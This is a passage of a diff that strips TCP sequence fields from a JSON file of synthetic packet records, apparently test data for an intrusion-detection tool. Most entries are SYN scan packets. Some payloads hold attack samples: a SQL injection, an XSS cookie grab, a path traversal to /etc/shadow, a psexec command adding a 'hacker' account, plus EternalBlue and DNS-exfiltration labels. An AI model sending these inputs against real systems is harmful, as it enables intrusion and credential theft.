     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 359925136,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.800",
@@ -2770,9 +2402,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 310755180,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.850",
@@ -2785,9 +2415,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 132013818,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.900",
@@ -2800,9 +2428,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 102631384,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.950",
@@ -2815,9 +2441,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 227011885,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.000",
@@ -2830,9 +2454,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 260364863,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.050",
@@ -2845,9 +2467,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 188050790,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.100",
@@ -2860,9 +2480,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 327566010,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.150",
@@ -2875,9 +2493,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 224422759,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.200",
@@ -2890,9 +2506,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 32152977,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.250",
@@ -2905,9 +2519,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 278509756,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.300",
@@ -2920,9 +2532,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 118337649,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.350",
@@ -2935,9 +2545,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 268631618,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.400",
@@ -2950,9 +2558,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 387399582,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.450",
@@ -2965,9 +2571,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 85241138,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.500",
@@ -2980,9 +2584,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 287172620,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.550",
@@ -2995,9 +2597,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 281217070,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.600",
@@ -3010,9 +2610,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 181230724,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.650",
@@ -3025,9 +2623,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 79612630,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.700",
@@ -3040,9 +2636,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 47876100,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.750",
@@ -3055,9 +2649,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 357557265,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.800",
@@ -3070,9 +2662,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 108078301,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.850",
@@ -3085,9 +2675,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 158493558,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.900",
@@ -3100,9 +2688,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 309894891,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:04.950",
@@ -3115,9 +2701,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 273967565,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.000",
@@ -3130,9 +2714,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 368277223,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.050",
@@ -3145,9 +2727,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 336999169,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.100",
@@ -3160,9 +2740,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 282654537,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.150",
@@ -3175,9 +2753,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 301466607,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.200",
@@ -3190,9 +2766,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 390708089,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.250",
@@ -3205,9 +2779,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 282812765,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.300",
@@ -3220,9 +2792,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 237527937,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.350",
@@ -3235,9 +2805,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 288351702,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.400",
@@ -3250,9 +2818,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 181641692,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.450",
@@ -3265,9 +2831,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 364027373,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.500",
@@ -3280,9 +2844,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 260709207,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.550",
@@ -3295,9 +2857,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 41144698,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.600",
@@ -3310,9 +2870,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 267689466,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.650",
@@ -3325,9 +2883,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 114708170,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.700",
@@ -3340,9 +2896,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 217701610,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.750",
@@ -3355,9 +2909,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 341624063,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.800",
@@ -3370,9 +2922,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 336606085,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.850",
@@ -3385,9 +2935,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 113035001,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.900",
@@ -3400,9 +2948,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 121458571,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:05.950",
@@ -3415,9 +2961,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 352533175,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.000",
@@ -3430,9 +2974,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 180385446,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.050",
@@ -3445,9 +2987,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 226164559,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.100",
@@ -3460,9 +3000,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 81303440,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.150",
@@ -3475,9 +3013,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 395493773,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.200",
@@ -3490,9 +3026,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 51475047,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.250",
@@ -3505,9 +3039,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 153285253,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.300",
@@ -3520,9 +3052,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 351735593,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.350",
@@ -3535,9 +3065,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 59511180,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.400",
@@ -3550,9 +3078,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 274572902,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.450",
@@ -3565,9 +3091,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 330589622,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.500",
@@ -3580,9 +3104,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 72319757,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.550",
@@ -3595,9 +3117,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 168645040,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.600",
@@ -3610,9 +3130,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 144682655,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.650",
@@ -3625,9 +3143,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 353059071,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.700",
@@ -3640,9 +3156,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 158495147,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.750",
@@ -3655,9 +3169,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 305760591,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.800",
@@ -3670,9 +3182,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 250822298,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.850",
@@ -3685,9 +3195,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 40542103,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.900",
@@ -3700,9 +3208,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 173322982,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:06.950",
@@ -3715,9 +3221,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 188792239,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.000",
@@ -3730,9 +3234,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 378632453,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.050",
@@ -3745,9 +3247,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 208976965,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.100",
@@ -3760,9 +3260,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 298412450,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.150",
@@ -3775,9 +3273,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 169911042,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.200",
@@ -3790,9 +3286,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 50908372,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.250",
@@ -3805,9 +3299,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 165393185,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.300",
@@ -3820,9 +3312,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 44397213,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.350",
@@ -3835,9 +3325,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 151603634,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.400",
@@ -3850,9 +3338,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 272616826,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.450",
@@ -3865,9 +3351,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 31930981,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.500",
@@ -3880,9 +3364,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 102755553,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.550",
@@ -3895,9 +3377,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 23387245,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.600",
@@ -3910,9 +3390,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 204399540,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.650",
@@ -3925,9 +3403,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 342049816,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.700",
@@ -3940,9 +3416,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 299838000,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.750",
@@ -3955,9 +3429,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 244668846,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.800",
@@ -3970,9 +3442,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 10940062,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.850",
@@ -3985,9 +3455,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 244032234,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.900",
@@ -4000,9 +3468,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 272111430,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:07.950",
@@ -4015,9 +3481,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 319442955,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.000",
@@ -4030,9 +3494,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 193034104,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.050",
@@ -4045,9 +3507,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 120188046,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.100",
@@ -4060,9 +3520,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 117730113,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.150",
@@ -4075,9 +3533,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 206394413,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.200",
@@ -4090,9 +3546,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 216628317,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.250",
@@ -4105,9 +3559,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 336430846,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.300",
@@ -4120,9 +3572,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 371858690,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.350",
@@ -4135,9 +3585,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 25567082,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.400",
@@ -4150,9 +3598,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 108706104,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:08.450",
@@ -4165,9 +3611,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 117283731,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.000",
@@ -4180,9 +3624,7 @@
     "direction": "request",
     "flags": "",
     "payload": "dns-tunnel-encoded-data-exfil",
-    "payload_len": 29,
-    "tcp_seq": null,
-    "tcp_ack": null
+    "payload_len": 29
   },
   {
     "timestamp": "2026-07-08T10:08:00.050",
@@ -4195,9 +3637,7 @@
     "direction": "request",
     "flags": "",
     "payload": "UERQTkZUZUFNQ1JURlNFQ1JFVFNMRUF LRUxBUFRIRUZJTEVUT09MRU5HVE9CRUFU VUNLRVI",
-    "payload_len": 73,
-    "tcp_seq": null,
-    "tcp_ack": null
+    "payload_len": 73
   },
   {
     "timestamp": "2026-07-08T10:08:00.100",
@@ -4210,9 +3650,7 @@
     "direction": "request",
     "flags": "",
     "payload": "dns-tunnel-encoded-very-long-subdomain-data-exfiltration-attempt",
-    "payload_len": 64,
-    "tcp_seq": null,
-    "tcp_ack": null
+    "payload_len": 64
   },
   {
     "timestamp": "2026-07-08T10:08:00.150",
@@ -4225,9 +3663,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "SMB negotiate protocol request with EternalBlue exploit attempt against doublepulsar backdoor",
-    "payload_len": 93,
-    "tcp_seq": 279889491,
-    "tcp_ack": 0
+    "payload_len": 93
   },
   {
     "timestamp": "2026-07-08T10:08:00.200",
@@ -4240,9 +3676,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "psexec service install cmd.exe /c net user hacker Pass123! /add",
-    "payload_len": 63,
-    "tcp_seq": 342313561,
-    "tcp_ack": 0
+    "payload_len": 63
   },
   {
     "timestamp": "2026-07-08T10:08:00.250",
@@ -4255,9 +3689,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "SMB tree connect IPC$ share then \\pipe\\svcctl for remote service creation",
-    "payload_len": 73,
-    "tcp_seq": 62448300,
-    "tcp_ack": 0
+    "payload_len": 73
   },
   {
     "timestamp": "2026-07-08T10:08:00.300",
@@ -4270,9 +3702,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /api/search HTTP/1.1\r\n\r\nq=test UNION SELECT password FROM admin--",
-    "payload_len": 70,
-    "tcp_seq": 311032056,
-    "tcp_ack": 0
+    "payload_len": 70
   },
   {
     "timestamp": "2026-07-08T10:08:00.350",
@@ -4285,9 +3715,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /forum?msg=<script>alert(document.cookie)</script> HTTP/1.1",
-    "payload_len": 63,
-    "tcp_seq": 310578810,
-    "tcp_ack": 0
+    "payload_len": 63
   },
   {
     "timestamp": "2026-07-08T10:08:00.400",
@@ -4300,9 +3728,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /download?path=../../../etc/shadow HTTP/1.1",
-    "payload_len": 47,
-    "tcp_seq": 34422429,
-    "tcp_ack": 0
+    "payload_len": 47
   },
   {
     "timestamp": "2026-07-08T10:08:00.450",
@@ -4315,9 +3741,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 146612871,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.500",
@@ -4330,9 +3754,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 659346982,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.550",
@@ -4345,9 +3767,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 393090406,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.600",
@@ -4360,9 +3780,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 728427920,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.650",
@@ -4375,9 +3793,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 327479433,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.700",
@@ -4390,9 +3806,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 761291178,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.750",
@@ -4405,9 +3819,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 144150801,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.800",
@@ -4420,9 +3832,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 500405394,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.850",
@@ -4435,9 +3845,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 73933555,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.900",
@@ -4450,9 +3858,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 886883182,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:00.950",
@@ -4465,9 +3871,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 209839597,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.000",
@@ -4480,9 +3884,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 748111612,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:08:01.050",
@@ -4495,9 +3897,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 249224101,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
